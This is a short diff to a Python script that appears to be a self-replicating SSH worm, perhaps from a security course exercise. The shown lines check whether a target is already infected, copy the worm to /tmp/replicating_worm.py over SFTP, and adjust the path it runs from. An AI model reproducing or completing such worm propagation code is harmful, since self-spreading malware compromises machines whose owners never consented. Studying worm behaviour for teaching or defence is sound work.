@@ -132,7 +132,7 @@ def startAttacking(wormLocation, isHost):
 		if isHost:
 			print("SSH Info: %s" %(str(sshInfo)))
 		
-		if sshInfo and not isTargetInfected(sshInfo[0]):
+		if sshInfo and isTargetInfected(sshInfo[0]) == False:
 			
 			sftpClient = sshInfo[0].open_sftp()
 			sftpClient.put(wormLocation, "/tmp/" + "replicating_worm.py")
@@ -150,7 +150,7 @@ elif sys.argv[1] == "-host":
 	startAttacking("replicating_worm.py", True)
 else:
 	markSystem()
-	startAttacking("/tmp/replicating_worm.py", False)
+	startAttacking("replicating_worm.py", False)
 
 
 
